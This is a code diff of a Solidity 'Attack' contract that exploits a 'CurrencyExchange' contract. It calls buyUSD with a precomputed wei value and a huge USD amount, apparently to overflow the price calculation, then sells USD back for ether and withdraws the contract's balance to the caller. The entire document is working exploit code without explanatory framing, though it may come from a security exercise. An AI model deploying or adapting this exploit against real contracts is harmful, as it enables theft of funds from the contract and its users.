@@ -4,19 +4,26 @@ import "./CurrencyExchange.sol";
 
 
 contract Attack {
-    CurrencyExchange exh;
+    CurrencyExchange exch;
 
-    constructor(address _addr) public {
-        exh = CurrencyExchange(_addr);
+    constructor(address _addr) public payable {
+        exch = CurrencyExchange(_addr);
     }
 
-    function buyUSD() public payable {
+    function attackUSD() public payable {
         // Wei value: 415992086870360064
         // USD amount: 231584178474632390847141970017375815706539969331281128078916000
-        exh.buyUSD{ value: 415992086870360064  }(231584178474632390847141970017375815706539969331281128078916000);  
+        exch.buyUSD{ value: 415992086870360064  }(231584178474632390847141970017375815706539969331281128078916000);
+        exch.sellUSD(2000);
     }
 
     function getBalance() public view returns (uint) {
-    return address(this).balance;
+        return address(this).balance;
     }
+
+    function getFunds() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    
 }
